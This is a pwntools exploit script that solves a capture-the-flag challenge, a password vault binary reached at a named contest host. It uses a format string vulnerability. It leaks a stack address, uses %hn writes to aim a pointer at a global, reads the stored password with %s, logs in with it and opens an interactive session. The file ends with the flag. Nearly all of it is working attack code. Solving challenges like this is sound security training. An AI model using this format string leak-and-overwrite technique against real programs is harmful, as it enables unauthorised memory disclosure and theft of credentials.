#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 9999
HOST = "chall.cscv.vn"
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x000000000040153C
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    exe = context.binary = ELF('./vault_elf', checksec=False)
    p = exe.process()

def add(name, data):
	p.sendlineafter(b'>>> ', str(1))
	p.sendafter(b'name: ', name)
	p.sendafter(b'secret: ', data)

def show():
	p.sendlineafter(b'>>> ', str(2))

def login(passwd):
    p.sendlineafter(b'>>> ', str(3))
    p.sendafter(b'password: ', passwd)

# VARIABLE
target = 0x4040a0

# PAYLOAD
add(b'a', b'%17$p')
show()
p.recvuntil(b'Secret: ')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))
payload = f'%{stack_leak - 0x20 & 0xffff}c%17$hn|%47$p'.encode()
add(b'a', payload)
show()
payload = f'%{target & 0xffff}c%47$hn'.encode()
add(b'b', payload)
show()
add(b'c', b'%43$s')
show()
p.recvuntil(b'--- Entry #3 ---')
p.recvuntil(b'Secret: ')
passwd = p.recvuntil(b'Access', drop=True)
print(b"Password: " + passwd)
login(passwd)

p.interactive()

# CSCV2025{f0rm4t_str1ng_l34k_4nd_0v3rwr1t3_ftw_2024}